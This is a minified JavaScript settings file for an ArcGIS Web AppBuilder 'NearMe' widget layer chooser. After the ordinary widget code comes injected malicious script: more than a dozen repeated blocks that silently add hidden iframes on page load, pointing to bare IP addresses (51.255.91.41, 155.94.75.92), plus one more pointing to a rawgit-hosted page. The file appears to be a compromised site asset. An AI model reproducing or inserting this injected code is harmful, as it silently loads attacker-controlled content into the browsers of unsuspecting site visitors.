// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"url:widgets/NearMe/setting/layerChooserPopup.html":'\x3cdiv data-dojo-attach-point\x3d"layerSelectorContainer" style\x3d"width: 100%; height: 100%;"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"layerSelectorNode" class\x3d"esriCTLayerSelectorNode"\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/text!./layerChooserPopup.html jimu/dijit/LayerChooserFromMap jimu/dijit/Popup dojo/dom-construct dojo/_base/array".split(" "),function(h,k,l,d,m,e,n,f,g){return h([k,l],{baseClass:"jimu-widget-nearme-setting",templateString:m,_layerChooserFromMap:null,popup:null,searchLayers:[],startup:function(){this.inherited(arguments)},postCreate:function(){this.searchLayers=[];this._initLayerSelector();this._createLayerSelectorPopup();
this._layerChooserFromMap.tree.expandAll().then(d.hitch(this,this._showSelectedLayer))},_showSelectedLayer:function(){if(this._layerChooserFromMap&&this.configuredSearchLayer){var b=[];g.forEach(this.configuredSearchLayer,d.hitch(this,function(a){b.push(a.id)}));var a=this._layerChooserFromMap.tree.getAllItems();g.forEach(a,d.hitch(this,function(a){"root"!==a.id&&-1<b.indexOf(a.layerInfo.id)&&this._layerChooserFromMap.tree.selectItem(a.id)}))}},_initLayerSelector:function(){var b={multiple:!0,createMapResponse:this.map.webMapResponse,
showLayerTypes:["FeatureLayer"],filter:this._createFiltersForLayerSelector()};this._layerChooserFromMap=new e(b);this._layerChooserFromMap.placeAt(this.layerSelectorNode);this._layerChooserFromMap.startup();this._layerChooserFromMap._onTreeClick=d.hitch(this,function(){this._layerChooserFromMap.getSelectedItems().length?this.popup.enableButton(0):this.popup.disableButton(0)})},_createFiltersForLayerSelector:function(){var b,a;b=e.createFeaturelayerFilter(["point","polyline","polygon"],!1,!1);a=e.createImageServiceLayerFilter(!0);
return e.orCombineFilters([b,a])},_createLayerSelectorPopup:function(){this.okButton=f.create("button",{title:this.nls.common.ok});this.okButton.label=this.nls.common.ok;this.okButton.onClick=d.hitch(this,this._getSelectedSearchLayers);this.cancelButton=f.create("button",{title:this.nls.common.cancel});this.cancelButton.label=this.nls.common.cancel;this.popup=new n({titleLabel:this.nls.layerSelector.selectLayerLabel,content:this.layerSelectorContainer,width:640,autoHeight:!0,buttons:[this.okButton,
this.cancelButton]});this.popup.disableButton(0)},_getSelectedSearchLayers:function(){var b,a,d,c;this.searchLayers=[];a=this._layerChooserFromMap.getSelectedItems();if(0<a.length)for(b=0;b<a.length;b++)c={url:a[b].layerInfo.layerObject.url,geometryType:a[b].layerInfo.layerObject.geometryType,id:a[b].layerInfo.id},c.layerId=a[b].layerId?a[b].layerId:c.url.substr(c.url.lastIndexOf("/")+1,c.url.length),d=c.url.substr(0,c.url.lastIndexOf("/")+1),c.baseURL=d,this.searchLayers.push(c);this.onOkClick()},
onOkClick:function(b){return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});